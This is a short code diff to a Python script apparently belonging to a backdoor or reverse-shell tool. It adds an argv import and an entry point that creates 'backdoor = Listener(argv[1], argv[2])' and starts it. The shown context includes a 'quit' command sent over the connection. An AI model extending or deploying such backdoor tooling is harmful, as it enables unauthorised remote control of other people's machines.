@@ -9,6 +9,7 @@ import json
 import os
 import base64
 from termcolor import colored
+from sys import argv
 
 
 class Listener:
@@ -95,3 +96,6 @@ class Listener:
             self.reliable_send(['quit'])
             print(colored('[+]Connection is closed', 'green'))
             exit(0)
+
+backdoor = Listener(argv[1], argv[2])
+backdoor.start()
